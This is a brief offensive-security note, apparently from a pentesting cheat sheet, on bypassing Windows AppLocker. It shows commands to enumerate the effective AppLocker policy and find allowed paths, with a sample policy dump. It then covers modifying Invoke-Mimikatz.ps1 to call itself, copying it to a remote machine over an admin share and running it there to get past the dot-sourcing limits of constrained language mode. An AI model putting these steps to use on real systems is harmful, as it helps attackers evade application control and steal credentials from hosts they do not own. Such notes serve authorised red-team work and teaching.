# Bypassing AppLocker
If you get errors when running powershell commands relating to language modes, this will be due to AppLocker running in Constrained Language Mode.

 - Check the AppLocker Language mode
`$ExecutionContext.SessionState.LanguageMode`

There may be elements within the AppLocker policy that show weak spots and these can be used to bypass it.

 - Enumerate the AppLocker policy
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 - Look for sections that state the Action = Allow and the PathConditions surrounding this policy.
 - Conversely look for paths that might be blocked, which might highlight areas that are inherently allowed.

e.g.
```
PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}

PublisherExceptions : {}

PathExceptions      : {}

HashExceptions      : {}

Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584

Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US

Description         :

UserOrGroupSid      : S-1-1-0

Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}

PublisherExceptions : {}

PathExceptions      : {}

HashExceptions      : {}

Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc

Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US

Description         :

UserOrGroupSid      : S-1-1-0

Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}

PathExceptions      : {}

PublisherExceptions : {}

HashExceptions      : {}

Id                  : 06dce67b-934c-454f-a263-2515c8796a5d

Name                : (Default Rule) All scripts located in the Program Files folder

Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.

UserOrGroupSid      : S-1-1-0

Action              : Allow

PathConditions      : {%WINDIR%\*}

PathExceptions      : {}

PublisherExceptions : {}

HashExceptions      : {}

Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c

Name                : (Default Rule) All scripts located in the Windows folder

Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.

UserOrGroupSid      : S-1-1-0

Action              : Allow
```

You may also run into difficulties loading modules with dot sourcing with AppLocker in play.
e.g.
`. .\Invoke-Mimikatz.ps1`

You can edit the ps1 module and add a line at the bottom to call itself.
e.g. open invoke-mimikatz.ps1, browse to the end of the file and add a line
`Invoke-Mimikatz`

Copy that script to the remote machine
`Copy-Item Invoke-Mimikatz-modified.ps1 \\<servername\path `
Now in a remote session on the machine you can load the module without using dot sourcing, effectively importing the module and running it in one go.
`.\Invoke-Mimikatz-modified.ps1`